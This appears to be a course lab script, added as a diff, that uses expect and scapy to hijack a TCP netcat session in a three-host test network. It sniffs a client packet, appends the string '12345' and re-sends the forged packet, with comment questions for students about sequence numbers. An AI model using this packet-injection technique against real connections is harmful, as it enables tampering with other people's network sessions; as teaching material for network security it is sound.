@@ -1,0 +1,67 @@
+#!/usr/bin/expect
+#
+# Author: M. Dacier
+# January 2022
+
+spawn "/usr/bin/scapy";
+expect ">>> ";
+
+# PAY ATTENTION TO escape the following chars: " [ and ]
+
+# Trivial script to hijack a TCP connection between c3 and s3 from r2
+# In s3, launch  nc -l 2000
+# In r2, launch this script and, only then, 
+# in c3: nc s3 2000
+
+# Result: the string "12345" will appear in s3 terminal
+
+# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully
+
+# After the experiment
+# Type "12345ABCD" in c3. What happens? 
+# type the same string again different result? Why ?
+
+# Redo the experiment but, this time,
+# Type "12345" in c3. What happens? 
+# type the same string again different result? Why ?
+
+# Redo the experiment but, this time,
+# Type "123" in c3. What happens? 
+# type the same string again different result? Why ?
+
+
+# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully
+
+# Horrible hack ... we sniff up to 5 packets for 10 seconds ..
+# hopefully this is enough time for the user to launch netcat
+# We only sniff the packets from the client as it should be the last one
+# speaking (acking) after a successful login
+
+send "cap = sniff(filter=\"tcp and dst host 20.20.20.55 and src host 20.20.20.89 and dst port 2000\", count=5, iface=\"eth2\", timeout=10) \r" 
+
+# We need to retrieve the last packet sent by the client,
+send "am=len(cap)-1\r"
+# am is the index of the last packet received
+
+send "data=cap\[am\].copy() \r"
+# how many bytes did the client sent in its last packet?
+# send "text=len(data\[Raw\].load)\r"
+# increase the seq number accordingly
+# send "data\[TCP\].seq=data\[TCP\].seq+text\r"
+
+send "command=\"12345\"\r"
+send "data=data / Raw(load=command) \r"
+send "del data\[TCP\].chksum \r"
+send "del data\[IP\].chksum \r"
+send "del data\[IP\].len \r"
+send "data\[TCP\].flags=\"PA\" \r"
+
+send "sendp(data, iface=\"eth2\") \r"
+
+
+# This last command enables us to stay within scapy to type more commands
+# interactively, if we so desire.
+
+interact
+
+
